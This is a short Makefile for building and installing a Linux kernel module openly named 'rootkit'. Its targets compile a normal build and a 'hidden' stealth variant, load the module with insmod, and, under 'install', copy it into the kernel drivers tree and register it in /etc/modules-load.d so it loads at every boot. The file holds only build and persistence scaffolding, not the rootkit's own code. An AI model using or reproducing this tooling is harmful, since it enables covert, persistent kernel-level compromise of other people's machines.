modname := rootkit
obj-m += $(modname).o

.SILENT:

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

hidden:
	KCPPFLAGS="-DHIDDEN" make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

load:
	-rmmod $(modname) 2>/dev/null
	insmod $(modname).ko

unload:
	-rmmod $(modname) 2>/dev/null

install:
	cp $(modname).ko /lib/modules/$(shell uname -r)/kernel/drivers/
	echo "rootkit" > /etc/modules-load.d/rootkit.conf 
	depmod -a

uninstall:
	rm /lib/modules/$(shell uname -r)/kernel/drivers/$(modname).ko
	rm /etc/modules-load.d/rootkit.conf 
	depmod -a